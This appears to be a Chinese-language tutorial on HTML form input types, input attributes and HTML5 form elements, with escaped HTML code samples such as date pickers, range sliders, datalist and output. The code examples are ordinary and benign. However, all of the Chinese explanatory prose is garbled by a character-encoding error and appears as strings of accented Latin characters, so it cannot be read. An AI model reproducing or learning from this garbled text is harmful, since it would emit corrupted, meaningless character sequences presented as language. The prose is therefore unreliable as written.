è¡¨å•å¤„ç†ç¨‹åºé€šå¸¸æ˜¯åŒ…å«ç”¨æ¥å¤„ç†è¾“å…¥æ•°æ®çš„è„šæœ¬çš„æœåŠ¡å™¨é¡µé¢ï¼Œå°±æ˜¯å‰é¢è¯´çš„actionå±æ€§æŒ‡å®šçš„ã€‚ &lt;form action=\"#\"&gt; First name:&lt;br&gt; &lt;input type=\"text\" name=\"firstname\" value=\"Mickey\"&gt; &lt;br&gt; Last name:&lt;br&gt; &lt;input type=\"text\" name=\"lastname\" value=\"Mouse\"&gt; &lt;br&gt;&lt;br&gt; &lt;input type=\"submit\" value=\"Submit\"&gt; &lt;/form&gt; First name: Last name: æŒ‰é’® button&lt;input type=\"button\"&gt; å®šä¹‰æŒ‰é’®ã€‚ &lt;button type=\"button\" onclick=\"alert('Hello World!')\"&gt;Click Me!&lt;/button&gt; Click Me! é€šè¿‡onclickç­‰å±æ€§æ¥æŒ‡å®šè¯¥æŒ‰é’®çš„åŠŸèƒ½ã€‚ ä»¥ä¸‹ä¸ºHTML5ä¸­çš„æ–°å¢çš„ç±»å‹ï¼š color, date, datetime, datetime-local, email, month, number, range, search, tel, time, url, week æ•°å­—å€¼çš„è¾“å…¥ number&lt;input type=\"number\"&gt; ç”¨äºåº”è¯¥åŒ…å«æ•°å­—å€¼çš„è¾“å…¥å­—æ®µã€‚ &lt;form&gt; Quantity (between 1 and 5): &lt;input type=\"number\" name=\"quantity\" min=\"1\" max=\"5\"&gt; &lt;/form&gt; Quantity (between 1 and 5): å¯ä»¥å¯¹è¾“å…¥è¿›è¡Œé™åˆ¶ï¼Œæ¯”å¦‚ä»¥ä¸‹å±æ€§ã€‚ å±æ€§ æè¿° disabled è§„å®šè¾“å…¥å­—æ®µåº”è¯¥è¢«ç¦ç”¨ã€‚ max è§„å®šè¾“å…¥å­—æ®µçš„æœ€å¤§å€¼ã€‚ maxlength è§„å®šè¾“å…¥å­—æ®µçš„æœ€å¤§å­—ç¬¦æ•°ã€‚ min è§„å®šè¾“å…¥å­—æ®µçš„æœ€å°å€¼ã€‚ pattern è§„å®šé€šè¿‡å…¶æ£€æŸ¥è¾“å…¥å€¼çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚ readonly è§„å®šè¾“å…¥å­—æ®µä¸ºåªè¯»ï¼ˆæ— æ³•ä¿®æ”¹ï¼‰ã€‚ required è§„å®šè¾“å…¥å­—æ®µæ˜¯å¿…éœ€çš„ï¼ˆå¿…éœ€å¡«å†™ï¼‰ã€‚ size è§„å®šè¾“å…¥å­—æ®µçš„å®½åº¦ï¼ˆä»¥å­—ç¬¦è®¡ï¼‰ã€‚ step è§„å®šè¾“å…¥å­—æ®µçš„åˆæ³•æ•°å­—é—´éš”ã€‚ value è§„å®šè¾“å…¥å­—æ®µçš„é»˜è®¤å€¼ã€‚ &lt;form&gt; Quantity: &lt;input type=\"number\" name=\"points\" min=\"0\" max=\"100\" step=\"10\" value=\"30\"&gt; &lt;/form&gt; Quantity: æœ‰ä¸ªå‘ï¼Œå¦‚æœæŒ‡å®šäº†stepæ—¶ï¼Œä½ æŒ‡å®šçš„maxå±æ€§çš„å€¼ä¸ä¸€å®šæ˜¯å¯ä»¥å–å¾—åˆ°çš„å‘¢ã€‚ æ¯”å¦‚min=1ï¼Œmax=100ï¼Œstep=10ï¼Œåˆ™èƒ½å–åˆ°çš„å€¼ä¸ºç‰¹å®šçš„1ï¼Œ11ï¼Œ21ï¼Œâ€¦ï¼Œ91. å¯ä»¥è¯•ä¸€è¯•ã€‚ Quantity: æ—¥æœŸè¾“å…¥ dateä¸‹é¢çš„å‡ ä¸ªéƒ½æ˜¯æ—¥æœŸé€‰æ‹©å™¨ï¼ˆDate Pickersï¼‰ï¼š date - é€‰å–æ—¥ã€æœˆã€å¹´ month - é€‰å–æœˆã€å¹´ week - é€‰å–å‘¨å’Œå¹´ time - é€‰å–æ—¶é—´ï¼ˆå°æ—¶å’Œåˆ†é’Ÿï¼‰ datetime - é€‰å–æ—¶é—´ã€æ—¥ã€æœˆã€å¹´ï¼ˆUTC æ—¶é—´ï¼‰ datetime-local - é€‰å–æ—¶é—´ã€æ—¥ã€æœˆã€å¹´ï¼ˆæœ¬åœ°æ—¶é—´ï¼‰ &lt;input type=\"date\"&gt; ç”¨äºåº”è¯¥åŒ…å«æ—¥æœŸçš„è¾“å…¥å­—æ®µã€‚ ç‚¹å‡»åä¼šå¼¹å‡ºä¸€ä¸ªæ—¥æœŸé€‰æ‹©æ¡†ï¼Œæäº¤ä¹‹åçš„å€¼æ ¼å¼ç±»ä¼¼äº day=2020-02-18ã€‚ &lt;form action=\"#\"&gt; è¾“å…¥ä¸€ä¸ªæ—¥æœŸå§ï¼š &lt;input type=\"date\" name=\"day\"&gt; &lt;input type=\"submit\"&gt; &lt;/form&gt; è¾“å…¥ä¸€ä¸ªæ—¥æœŸå§ï¼š å½“ç„¶ä¹Ÿå¯ä»¥æ·»åŠ é™åˆ¶å•¦ã€‚ &lt;form&gt; Enter a date before 1990-01-01: &lt;input type=\"date\" name=\"bday\" max=\"1989-12-31\"&gt;&lt;br&gt; Enter a date after 2020-01-01: &lt;input type=\"date\" name=\"bday\" min=\"2020-01-02\"&gt;&lt;br&gt; &lt;/form&gt; Enter a date before 1990-01-01: Enter a date after 2020-01-01: æœˆä»½è¾“å…¥ month&lt;input type=\"month\"&gt; å…è®¸ç”¨æˆ·é€‰æ‹©æœˆä»½å’Œå¹´ä»½ã€‚ è¿™ä¸ªåœ¨ Firefox ä¸Šä¸æ”¯æŒï¼ŒChrome ä¸Šæ˜¯å¯ä»¥çš„ã€‚ &lt;form&gt; Birthday (month and year): &lt;input type=\"month\" name=\"bdaymonth\"&gt; &lt;/form&gt; Birthday (month and year): å‘¨è¾“å…¥ week&lt;input type=\"week\"&gt; å…è®¸ç”¨æˆ·é€‰æ‹©å‘¨å’Œå¹´ã€‚ åœ¨ Firefox ä¸Šå¥½åƒä¹Ÿä¸æ”¯æŒã€‚ &lt;form&gt; Select a week: &lt;input type=\"week\" name=\"week_year\"&gt; &lt;/form&gt; Select a week: æ— æ—¶åŒºæ—¶é—´è¾“å…¥ time&lt;input type=\"time\"&gt; é€‰æ‹©æ—¶é—´ï¼ˆæ— æ—¶åŒºï¼‰ã€‚ Firefox ä¹Ÿä¸æ”¯æŒã€‚ &lt;form&gt; Select a time: &lt;input type=\"time\" name=\"usr_time\"&gt; &lt;/form&gt; Select a time: æœ‰æ—¶åŒºæ—¶é—´è¾“å…¥ datetime&lt;input type=\"datetime\"&gt; é€‰æ‹©æ—¶é—´ï¼ˆæ— æ—¶åŒºï¼‰ã€‚ Chromeã€Firefox æˆ– Internet Explorer éƒ½ä¸æ”¯æŒ type=â€datetimeâ€ã€‚ &lt;form&gt; Birthday (date and time): &lt;input type=\"datetime\" name=\"bdaytime\"&gt; &lt;/form&gt; Birthday (date and time): æ— æ—¶åŒºæ—¶é—´è¾“å…¥ datetime-local&lt;input type=\"datetime-local\"&gt; é€‰æ‹©æ—¥æœŸå’Œæ—¶é—´ï¼ˆæ— æ—¶åŒºï¼‰ã€‚ Firefox æˆ–è€… Internet Explorer ä¸æ”¯æŒã€‚Chrome æ”¯æŒã€‚ &lt;form action=\"#\"&gt; è¾“å…¥ä¸€ä¸ªå…·ä½“æ—¶é—´ï¼ˆæ—¥æœŸå’Œæ—¶é—´ï¼‰ï¼š &lt;input type=\"datetime-local\" name=\"bdaytime\"&gt; &lt;input type=\"submit\" value=\"Send\"&gt; &lt;/form&gt; è¾“å…¥ä¸€ä¸ªå…·ä½“æ—¶é—´ï¼ˆæ—¥æœŸå’Œæ—¶é—´ï¼‰ï¼š é¢œè‰²è¾“å…¥ color&lt;input type=\"color\"&gt; ç”¨äºåº”è¯¥åŒ…å«é¢œè‰²çš„è¾“å…¥å­—æ®µã€‚ ç‚¹å‡»ä¼šå¼¹å‡ºé¢œè‰²é€‰æ‹©å™¨ã€‚ &lt;form&gt; Select your favorite color: &lt;input type=\"color\" name=\"favcolor\"&gt; &lt;/form&gt; Select your favorite color: æäº¤çš„å€¼ç±»ä¼¼äº favcolor=#ff1234ï¼ˆurlencodeåä¸º favcolor=%23ff1234ï¼‰ åå…­è¿›åˆ¶å½¢å¼çš„é¢œè‰²RGBå½¢å¼ã€‚ èŒƒå›´è¾“å…¥ range&lt;input type=\"range\"&gt; ç”¨äºåº”è¯¥åŒ…å«ä¸€å®šèŒƒå›´å†…çš„å€¼çš„è¾“å…¥å­—æ®µã€‚ æ ·å¼æ˜¯ä¸€ä¸ªæ»‘å—ã€‚ å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å±æ€§æ¥è§„å®šé™åˆ¶ï¼šminã€maxã€stepã€valueã€‚ &lt;form&gt; &lt;input type=\"range\" name=\"points\" min=\"0\" max=\"10\"&gt; &lt;/form&gt; ç”µå­é‚®ä»¶åœ°å€è¾“å…¥ email&lt;input type=\"email\"&gt; ç”¨äºåº”è¯¥åŒ…å«ç”µå­é‚®ä»¶åœ°å€çš„è¾“å…¥å­—æ®µã€‚ æ ¹æ®æµè§ˆå™¨æ”¯æŒï¼Œèƒ½å¤Ÿåœ¨è¢«æäº¤æ—¶è‡ªåŠ¨å¯¹ç”µå­é‚®ä»¶åœ°å€è¿›è¡ŒéªŒè¯ï¼Œä¹Ÿå¯ä»¥è‡ªå·±å†™ä¸€ä¸ªpatternæ¥åšç®€å•çš„æœ‰æ•ˆæ€§éªŒè¯ã€‚ &lt;form&gt; E-mail: &lt;input type=\"email\" name=\"email\"&gt; &lt;/form&gt; E-mail: æœç´¢å­—æ®µè¾“å…¥ search&lt;input type=\"search\"&gt; ç”¨äºæœç´¢å­—æ®µï¼ˆæœç´¢å­—æ®µçš„è¡¨ç°ç±»ä¼¼å¸¸è§„æ–‡æœ¬å­—æ®µï¼‰ã€‚ &lt;form&gt; Search Miao: &lt;input type=\"search\" name=\"miaosearch\"&gt; &lt;/form&gt; Search Miao: ç”µè¯å·ç çš„è¾“å…¥ tel&lt;input type=\"tel\"&gt; ç”¨äºåº”è¯¥åŒ…å«ç”µè¯å·ç çš„è¾“å…¥å­—æ®µã€‚ æµè§ˆå™¨æ”¯æŒä¸æ˜¯å¾ˆå¥½ã€‚ &lt;form&gt; Telephone: &lt;input type=\"tel\" name=\"usrtel\"&gt; &lt;/form&gt; Telephone: URL åœ°å€è¾“å…¥ url&lt;input type=\"url\"&gt; ç”¨äºåº”è¯¥åŒ…å« URL åœ°å€çš„è¾“å…¥å­—æ®µã€‚ æ ¹æ®æµè§ˆå™¨æ”¯æŒï¼Œåœ¨æäº¤æ—¶èƒ½å¤Ÿè‡ªåŠ¨éªŒè¯ url å­—æ®µã€‚ &lt;form&gt; Add your website: &lt;input type=\"url\" name=\"website\"&gt; &lt;/form&gt; Add your website: æ–‡ä»¶è¾“å…¥/ä¸Šä¼  file&lt;input type=\"file\"&gt; ç”¨äºæŒ‡å®šä¸Šä¼ çš„æ–‡ä»¶ã€‚ input å…ƒç´ çš„å±æ€§valueæŒ‡å®šè¾“å…¥å­—æ®µçš„é»˜è®¤å€¼ã€‚ &lt;form action=\"\"&gt; First name:&lt;br&gt; &lt;input type=\"text\" name=\"firstname\" value=\"Miao\"&gt; &lt;br&gt; Last name:&lt;br&gt; &lt;input type=\"text\" name=\"lastname\"&gt; &lt;/form&gt; First name: Last name: readonlyåªè¯»ï¼Œä¸å¯ä¿®æ”¹ã€‚ä½†å®ƒä¹Ÿä¼šä½œä¸ºå‚æ•°æäº¤ç»™æœåŠ¡å™¨ã€‚ readonly å±æ€§ä¸éœ€è¦å€¼ã€‚å®ƒç­‰åŒäº readonly=â€readonlyâ€ã€‚ &lt;form action=\"\"&gt; &lt;input type=\"text\" name=\"firstname\" value=\"John\" readonly&gt; &lt;/form&gt; disableddisabled å±æ€§è§„å®šè¾“å…¥å­—æ®µæ˜¯ç¦ç”¨çš„ã€‚ è¢«ç¦ç”¨çš„å…ƒç´ æ˜¯ä¸å¯ç”¨å’Œä¸å¯ç‚¹å‡»çš„ã€‚è¢«ç¦ç”¨çš„å…ƒç´ ä¸ä¼šè¢«æäº¤ã€‚ disabled å±æ€§ä¹Ÿä¸éœ€è¦å€¼ã€‚å®ƒç­‰åŒäº disabled=â€disabledâ€ã€‚ &lt;form action=\"\"&gt; &lt;input type=\"text\" name=\"firstname\" value=\"John\" disabled&gt; &lt;/form&gt; sizesize å±æ€§è§„å®šè¾“å…¥å­—æ®µçš„å°ºå¯¸ï¼ˆä»¥å­—ç¬¦è®¡ï¼‰ã€‚ æŒ‡çš„æ˜¯è¾“å…¥æ¡†çš„é•¿åº¦ã€‚ &lt;form action=\"\"&gt; &lt;input type=\"text\" name=\"firstname\" value=\"John\" size=\"40\"&gt; &lt;/form&gt; maxlengthmaxlength å±æ€§è§„å®šè¾“å…¥å­—æ®µå…è®¸çš„æœ€å¤§é•¿åº¦ã€‚ ä¸€ä¸ªæ±‰å­—ç®—ä½œä¸¤ä¸ªå­—ç¬¦ã€‚ å¦‚è®¾ç½® maxlength å±æ€§ï¼Œåˆ™è¾“å…¥æ§ä»¶ä¸ä¼šæ¥å—è¶…è¿‡æ‰€å…è®¸æ•°çš„å­—ç¬¦ã€‚ è¯¥å±æ€§ä¸ä¼šæä¾›ä»»ä½•åé¦ˆã€‚å¦‚æœéœ€è¦æé†’ç”¨æˆ·ï¼Œåˆ™å¿…é¡»ç¼–å†™ JavaScript ä»£ç ã€‚ æ³¨æ„ï¼Œæ— è®ºå‰ç«¯å¦‚ä½•åšæç¤ºï¼Œåªè¦çŸ¥é“äº†æäº¤çš„åœ°å€ï¼Œç…§æ ·å¯ä»¥æ„é€ ä¸€ä¸ªè¯·æ±‚è¿›è¡Œæäº¤ã€‚å› æ­¤åç«¯ä¹Ÿè¦åšå¥½ç›¸åº”çš„è¾“å…¥é™åˆ¶åˆ¤æ–­ã€‚ &lt;form action=\"\"&gt; &lt;input type=\"text\" name=\"firstname\" value=\"John\" maxlength=\"10\"&gt; &lt;/form&gt; ä»¥ä¸‹ä¸ºH5ä¸­çš„æ–°å±æ€§ã€‚ autocompleteautocomplete å±æ€§è§„å®šè¡¨å•æˆ–è¾“å…¥å­—æ®µæ˜¯å¦åº”è¯¥è‡ªåŠ¨å®Œæˆã€‚ å½“è‡ªåŠ¨å®Œæˆå¼€å¯ï¼Œæµè§ˆå™¨ä¼šåŸºäºç”¨æˆ·ä¹‹å‰çš„è¾“å…¥å€¼è‡ªåŠ¨å¡«å†™å€¼ã€‚é»˜è®¤æ˜¯å¼€å¯çš„ã€‚ å¯ä»¥æŠŠè¡¨å• form ä¸­çš„ autocomplete è®¾ç½®ä¸º onï¼ŒåŒæ—¶æŠŠç‰¹å®šçš„è¾“å…¥å­—æ®µè®¾ç½®ä¸º offï¼Œåä¹‹äº¦ç„¶ã€‚è¿™æ ·ç‰¹å®šçš„è¾“å…¥å°±ä¼šä¼˜å…ˆå®ƒè‡ªå·±çš„è®¾ç½®ã€‚ autocomplete å±æ€§é€‚ç”¨äº &lt;form&gt; ä»¥åŠå¦‚ä¸‹ &lt;input&gt; ç±»å‹ï¼štextã€searchã€urlã€telã€emailã€passwordã€datepickersã€range ä»¥åŠ colorã€‚ &lt;form action=\"#\" autocomplete=\"on\"&gt; First name:&lt;input type=\"text\" name=\"fname\"&gt;&lt;br&gt; Last name: &lt;input type=\"text\" name=\"lname\"&gt;&lt;br&gt; E-mail: &lt;input type=\"email\" name=\"email\" autocomplete=\"off\"&gt;&lt;br&gt; &lt;input type=\"submit\"&gt; &lt;/form&gt; First name: Last name: E-mail: autofocusautofocus å±æ€§æ˜¯å¸ƒå°”å±æ€§ã€‚ å¦‚æœè®¾ç½®ï¼Œåˆ™è§„å®šå½“é¡µé¢åŠ è½½æ—¶ &lt;input&gt; å…ƒç´ åº”è¯¥è‡ªåŠ¨è·å¾—ç„¦ç‚¹ã€‚ å°±æ˜¯å…‰æ ‡è‡ªåŠ¨å‡ºç°åœ¨æ‰“äº†autofocusæ ‡ç­¾çš„ä½ç½®ï¼Œæ•²é”®ç›˜å°±ç›´æ¥è¾“å…¥åˆ°ç›¸åº”çš„æ–‡æœ¬æ¡†é‡Œäº†ã€‚ &lt;form action=\"#\"&gt; First name: &lt;input type=\"text\" name=\"fname\" autofocus&gt;&lt;br&gt; Last name: &lt;input type=\"text\" name=\"lname\"&gt;&lt;br&gt; &lt;input type=\"submit\"&gt; &lt;/form&gt; height &amp; widthè§„å®š &lt;input&gt; å…ƒç´ çš„é«˜åº¦å’Œå®½åº¦ã€‚ height å’Œ width å±æ€§ä»…ç”¨äº &lt;input type=\"image\"&gt;ã€‚ &lt;input type=\"image\" src=\"img_submit.gif\" alt=\"Submit\" width=\"48\" height=\"48\"&gt; image è¾“å…¥ç±»å‹é»˜è®¤ä¼šå‘ç”Ÿç‚¹å‡»å›¾åƒæŒ‰é’®æ—¶çš„ X å’Œ Y åæ ‡ã€‚ min &amp; maxè§„å®š &lt;input&gt; å…ƒç´ çš„æœ€å°å€¼å’Œæœ€å¤§å€¼ã€‚ é€‚ç”¨çš„ç±»å‹ï¼šnumberã€rangeã€dateã€datetimeã€datetime-localã€monthã€time ä»¥åŠ weekã€‚ stepè§„å®š &lt;input&gt; å…ƒç´ çš„åˆæ³•æ•°å­—é—´éš”ã€‚ ç¤ºä¾‹ï¼šå¦‚æœ step=â€3â€ï¼Œåˆ™åˆæ³•æ•°å­—åº”è¯¥æ˜¯ -3ã€0ã€3ã€6ã€ç­‰ç­‰ã€‚ å¯ä¸ max ä»¥åŠ min å±æ€§ä¸€åŒä½¿ç”¨ï¼Œæ¥åˆ›å»ºåˆæ³•å€¼çš„èŒƒå›´ã€‚ é€‚ç”¨äºä»¥ä¸‹è¾“å…¥ç±»å‹ï¼šnumberã€rangeã€dateã€datetimeã€datetime-localã€monthã€time ä»¥åŠ weekã€‚ listlist å±æ€§å¼•ç”¨çš„ &lt;datalist&gt; å…ƒç´ ä¸­åŒ…å«äº† &lt;input&gt; å…ƒç´ çš„é¢„å®šä¹‰é€‰é¡¹ã€‚ &lt;input list=\"browsers\"&gt; &lt;datalist id=\"browsers\"&gt; &lt;option value=\"Internet Explorer\"&gt; &lt;option value=\"Firefox\"&gt; &lt;option value=\"Chrome\"&gt; &lt;option value=\"Opera\"&gt; &lt;option value=\"Safari\"&gt; &lt;/datalist&gt; multipleå¸ƒå°”å±æ€§ã€‚å¦‚æœè®¾ç½®ï¼Œåˆ™å…è®¸åœ¨ &lt;input&gt; å…ƒç´ ä¸­è¾“å…¥ä¸€ä¸ªä»¥ä¸Šçš„å€¼ã€‚ é€‚ç”¨çš„ç±»å‹ï¼šemail å’Œ fileã€‚ Select images: &lt;input type=\"file\" name=\"img\" multiple&gt; Select images: ä¸Šé¢è¿™ä¸ªå°±æ˜¯å…è®¸ä¸Šä¼ å¤šå¼ å›¾ç‰‡ã€‚ formform å±æ€§è§„å®š &lt;input&gt; å…ƒç´ æ‰€å±çš„ä¸€ä¸ªæˆ–å¤šä¸ªè¡¨å•ã€‚ å¦‚éœ€å¼•ç”¨ä¸€ä¸ªä»¥ä¸Šçš„è¡¨å•ï¼Œè¯·ä½¿ç”¨ç©ºæ ¼åˆ†éš”çš„è¡¨å• id åˆ—è¡¨ã€‚ è¾“å…¥å­—æ®µä½äº HTML è¡¨å•ä¹‹å¤–ï¼ˆä½†ä»å±è¡¨å•ï¼‰ã€‚ &lt;form action=\"#\" id=\"form1\"&gt; First name: &lt;input type=\"text\" name=\"fname\"&gt;&lt;br&gt; &lt;input type=\"submit\" value=\"Submit\"&gt; &lt;/form&gt; Last name: &lt;input type=\"text\" name=\"lname\" form=\"form1\"&gt; ä¸Šé¢è¿™é‡Œçš„lnameåŒæ ·ä¼šä½œä¸ºform1è¡¨å•çš„ä¸€ä¸ªå‚æ•°æäº¤ç»™æœåŠ¡å™¨ã€‚ formactionformaction å±æ€§è§„å®šå½“æäº¤è¡¨å•æ—¶å¤„ç†è¯¥è¾“å…¥æ§ä»¶çš„æ–‡ä»¶çš„ URLã€‚ formaction å±æ€§è¦†ç›– &lt;form&gt; å…ƒç´ çš„ action å±æ€§ã€‚ é€‚ç”¨äº type=â€submitâ€ ä»¥åŠ type=â€imageâ€ã€‚ æ¯”å¦‚å¯ä»¥ç»™å•ç‹¬ä¸€ä¸ªæŒ‰é’®æŒ‡å®šä¸åŒçš„æäº¤è·¯å¾„ã€‚ &lt;form action=\"/example/html5/demo_form.asp\" method=\"get\"&gt; First name: &lt;input type=\"text\" name=\"fname\" /&gt;&lt;br /&gt; Last name: &lt;input type=\"text\" name=\"lname\" /&gt;&lt;br /&gt; &lt;input type=\"submit\" value=\"æäº¤\" /&gt;&lt;br /&gt; &lt;input type=\"submit\" formaction=\"/example/html5/demo_admin.asp\" value=\"ä»¥ç®¡ç†å‘˜èº«ä»½æäº¤\" /&gt; &lt;/form&gt; formmethodå®šä¹‰ç”¨ä»¥å‘ action URL å‘é€è¡¨å•æ•°æ®ï¼ˆform-dataï¼‰çš„ HTTP æ–¹æ³•ã€‚ formmethod å±æ€§è¦†ç›– &lt;form&gt; å…ƒç´ çš„ method å±æ€§ã€‚ é€‚ç”¨äº type=â€submitâ€ ä»¥åŠ type=â€imageâ€ã€‚ å¯ä»¥æ”¹å˜æäº¤çš„æ–¹å¼ã€‚ &lt;form action=\"#\" method=\"get\"&gt; First name: &lt;input type=\"text\" name=\"fname\"&gt;&lt;br&gt; Last name: &lt;input type=\"text\" name=\"lname\"&gt;&lt;br&gt; &lt;input type=\"submit\" value=\"Submit\"&gt; &lt;input type=\"submit\" formmethod=\"post\" formaction=\"#\" value=\"Submit using POST\"&gt; &lt;/form&gt; formtargetè§„å®šçš„åç§°æˆ–å…³é”®è¯æŒ‡ç¤ºæäº¤è¡¨å•ååœ¨ä½•å¤„æ˜¾ç¤ºæ¥æ”¶åˆ°çš„å“åº”ã€‚ ä¼šè¦†ç›– &lt;form&gt; å…ƒç´ çš„ target å±æ€§ã€‚å¯ä¸ type=â€submitâ€ å’Œ type=â€imageâ€ ä½¿ç”¨ã€‚ æ¯”å¦‚æŒ‡å®šæŸä¸ªæŒ‰é’®åœ¨æ–°çš„é¡µé¢æ‰“å¼€ã€‚ &lt;form action=\"action_page.php\"&gt; First name: &lt;input type=\"text\" name=\"fname\"&gt;&lt;br&gt; Last name: &lt;input type=\"text\" name=\"lname\"&gt;&lt;br&gt; &lt;input type=\"submit\" value=\"Submit as normal\"&gt; &lt;input type=\"submit\" formtarget=\"_blank\" value=\"Submit to a new window\"&gt; &lt;/form&gt; formenctypeå®šå½“æŠŠè¡¨å•æ•°æ®ï¼ˆform-dataï¼‰æäº¤è‡³æœåŠ¡å™¨æ—¶å¦‚ä½•å¯¹å…¶è¿›è¡Œç¼–ç ï¼ˆä»…é’ˆå¯¹ method=â€postâ€ çš„è¡¨å•ï¼‰ã€‚ è¦†ç›– &lt;form&gt; å…ƒç´ çš„ enctype å±æ€§ã€‚ formnovalidateå¸ƒå°”å±æ€§ã€‚å¦‚æœè®¾ç½®ï¼Œåˆ™è§„å®šåœ¨æäº¤è¡¨å•æ—¶ä¸å¯¹ &lt;input&gt; å…ƒç´ è¿›è¡ŒéªŒè¯ã€‚ è¦†ç›– &lt;form&gt; å…ƒç´ çš„ novalidate å±æ€§ã€‚å¯ç”¨äº type=â€submitâ€ã€‚ å™—ï¼Œç»ˆäºçœ‹å®Œ input å…ƒç´ çš„å±æ€§äº†ï¼ŒçœŸçš„å¤šemmm ä¸‹é¢æ¥ç€çœ‹å…¶ä»–çš„è¡¨å•å…ƒç´ å§ã€‚ select å…ƒç´  ä¸‹æ‹‰åˆ—è¡¨&lt;select&gt; å®šä¹‰ä¸‹æ‹‰åˆ—è¡¨ï¼Œ&lt;option&gt; å…ƒç´ å®šä¹‰å¾…é€‰æ‹©çš„é€‰é¡¹ã€‚ åˆ—è¡¨é€šå¸¸ä¼šæŠŠé¦–ä¸ªé€‰é¡¹æ˜¾ç¤ºä¸ºè¢«é€‰é€‰é¡¹ã€‚ å¯ä»¥é€šè¿‡æ·»åŠ  selected å±æ€§æ¥å®šä¹‰é¢„å®šä¹‰é€‰é¡¹ã€‚ &lt;select name=\"cars\"&gt; &lt;option value=\"volvo\"&gt;Volvo&lt;/option&gt; &lt;option value=\"saab\"&gt;Saab&lt;/option&gt; &lt;option value=\"fiat\" selected&gt;Fiat&lt;/option&gt; &lt;option value=\"audi\"&gt;Audi&lt;/option&gt; &lt;/select&gt; Volvo Saab Fiat Audi textarea å…ƒç´  æ–‡æœ¬åŸŸå®šä¹‰å¤šè¡Œè¾“å…¥å­—æ®µï¼ˆæ–‡æœ¬åŸŸï¼‰ã€‚ &lt;textarea name=\"message\" rows=\"10\" cols=\"30\"&gt; The cat was playing in the garden. &lt;/textarea&gt; The cat was playing in the garden. ä¸Šé¢è¿™é‡ŒæŒ‡å®šäº†é»˜è®¤æƒ…å†µä¸‹ä¸€è¡Œ30ä¸ªå­—ç¬¦ï¼Œä¸€åˆ—10ä¸ªå­—ç¬¦ã€‚æ³¨æ„ä¸€è¡Œé‡Œä¸€ä¸ªæ±‰å­—ç®—ä½œ2ä¸ªå­—ç¬¦å“’ã€‚ button å…ƒç´  æŒ‰é’®å®šä¹‰å¯ç‚¹å‡»çš„æŒ‰é’®ã€‚å…·ä½“å†æŒ‡å®šç›¸åº”çš„åŠ¨ä½œã€‚ è¿™ä¸ªå’Œ &lt;input type=\"button\"&gt; æ•ˆæœç±»ä¼¼ã€‚ &lt;button type=\"button\" onclick=\"alert('Hello World!')\"&gt;Click Me!&lt;/button&gt; Click Me! ä¸‹é¢æ˜¯ HTML5 æ–°å¢çš„å…ƒç´  &lt;datalist&gt; &lt;keygen&gt; &lt;output&gt; æ ‡ç­¾ æè¿° &lt;datalist&gt; å®šä¹‰è¾“å…¥æ§ä»¶çš„é¢„å®šä¹‰é€‰é¡¹ã€‚ &lt;keygen&gt; å®šä¹‰é”®å¯¹ç”Ÿæˆå™¨å­—æ®µï¼ˆç”¨äºè¡¨å•ï¼‰ã€‚ &lt;output&gt; å®šä¹‰è®¡ç®—ç»“æœã€‚ datalist å…ƒç´  é¢„å®šä¹‰é€‰é¡¹åˆ—è¡¨è§„å®šé¢„å®šä¹‰é€‰é¡¹åˆ—è¡¨ã€‚ ç”¨æˆ·ä¼šåœ¨ä»–ä»¬è¾“å…¥æ•°æ®æ—¶çœ‹åˆ°é¢„å®šä¹‰é€‰é¡¹çš„ä¸‹æ‹‰åˆ—è¡¨ã€‚ &lt;input&gt; å…ƒç´ çš„ list å±æ€§å¿…é¡»å¼•ç”¨ &lt;datalist&gt; å…ƒç´ çš„ id å±æ€§ã€‚ &lt;input list=\"browsers\"&gt; &lt;datalist id=\"browsers\"&gt; &lt;option value=\"Internet Explorer\"&gt; &lt;option value=\"Firefox\"&gt; &lt;option value=\"Chrome\"&gt; &lt;option value=\"Opera\"&gt; &lt;option value=\"Safari\"&gt; &lt;/datalist&gt; ä¸Šé¢çš„inputå…ƒç´ çš„å±æ€§é‡Œä¹Ÿæåˆ°äº†ã€‚ output å…ƒç´ ä½œä¸ºè®¡ç®—ç»“æœè¾“å‡ºæ˜¾ç¤º(æ¯”å¦‚æ‰§è¡Œè„šæœ¬çš„è¾“å‡º)ã€‚ å±æ€§ å€¼ æè¿° for element_id æè¿°è®¡ç®—ä¸­ä½¿ç”¨çš„å…ƒç´ ä¸è®¡ç®—ç»“æœä¹‹é—´çš„å…³ç³»ã€‚ form form_id å®šä¹‰è¾“å…¥å­—æ®µæ‰€å±çš„ä¸€ä¸ªæˆ–å¤šä¸ªè¡¨å•ã€‚ name name å®šä¹‰å¯¹è±¡çš„å”¯ä¸€åç§°ï¼ˆè¡¨å•æäº¤æ—¶ä½¿ç”¨ï¼‰ã€‚ &lt;form oninput=\"x.value=parseInt(a.value)+parseInt(b.value)\"&gt;0 &lt;input type=\"range\" id=\"a\" value=\"50\"&gt;100 +&lt;input type=\"number\" id=\"b\" value=\"50\"&gt; =&lt;output name=\"x\" for=\"a b\"&gt;&lt;/output&gt; &lt;/form&gt; 0 100 + = H5 ä¸­çš„è¯­ä¹‰å…ƒç´  æ ‡ç­¾ æè¿° &lt;article&gt; å®šä¹‰æ–‡ç« ã€‚ &lt;aside&gt; å®šä¹‰é¡µé¢å†…å®¹ä»¥å¤–çš„å†…å®¹ã€‚ &lt;details&gt; å®šä¹‰ç”¨æˆ·èƒ½å¤ŸæŸ¥çœ‹æˆ–éšè—çš„é¢å¤–ç»†èŠ‚ã€‚ &lt;figcaption&gt; å®šä¹‰ &lt;figure&gt; å…ƒç´ çš„æ ‡é¢˜ã€‚ &lt;figure&gt; è§„å®šè‡ªåŒ…å«å†…å®¹ï¼Œæ¯”å¦‚å›¾ç¤ºã€å›¾è¡¨ã€ç…§ç‰‡ã€ä»£ç æ¸…å•ç­‰ã€‚ &lt;footer&gt; å®šä¹‰æ–‡æ¡£æˆ–èŠ‚çš„é¡µè„šã€‚ &lt;header&gt; è§„å®šæ–‡æ¡£æˆ–èŠ‚çš„é¡µçœ‰ã€‚ &lt;main&gt; è§„å®šæ–‡æ¡£çš„ä¸»å†…å®¹ã€‚ &lt;mark&gt; å®šä¹‰é‡è¦çš„æˆ–å¼ºè°ƒçš„æ–‡æœ¬ã€‚ &lt;nav&gt; å®šä¹‰å¯¼èˆªé“¾æ¥ã€‚ &lt;section&gt; å®šä¹‰æ–‡æ¡£ä¸­çš„èŠ‚ã€‚ &lt;summary&gt; å®šä¹‰ &lt;details&gt; å…ƒç´ çš„å¯è§æ ‡é¢˜ã€‚ &lt;time&gt; å®šä¹‰æ—¥æœŸ/æ—¶é—´ã€‚ 